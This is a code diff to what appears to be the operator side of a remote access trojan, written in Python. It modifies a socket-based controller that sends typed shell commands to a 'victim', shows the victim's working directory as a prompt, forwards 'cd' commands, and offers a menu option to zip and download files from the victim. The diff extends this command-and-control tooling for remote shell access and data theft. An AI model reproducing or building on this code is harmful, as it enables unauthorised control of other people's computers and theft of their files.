@@ -26,8 +26,15 @@ def handleConnection(my_socket):
             my_socket.send_data(user_input)
             print("Running Commands:")
             while(True):
-                print(">>>" , end = " ")
+                path = my_socket.recieve_data();
+                print(path , ">>" , end = " ")
+
                 command = input()
+                c = command.split()
+                if(c[0].lower() == "cd"):
+                    my_socket.send_data(command)
+                    continue
+                
                 if (command == "" or command == " "):
                     continue
 
@@ -57,10 +64,8 @@ def handleConnection(my_socket):
         elif user_input == "3":
 
             print("Download files from the victim")
-            skip = input("Hi! So here's the thing, if you want to download files, Use 'Run command' option \n wander to the directory you want to recieve, copy its path paste it here, and then files will be zipped and downloaded. To jump to running commands option type 'skip' ")
-
-            if(skip == "skip"):
-                continue
+            
+           
             
             my_socket.send_data(user_input)
                        
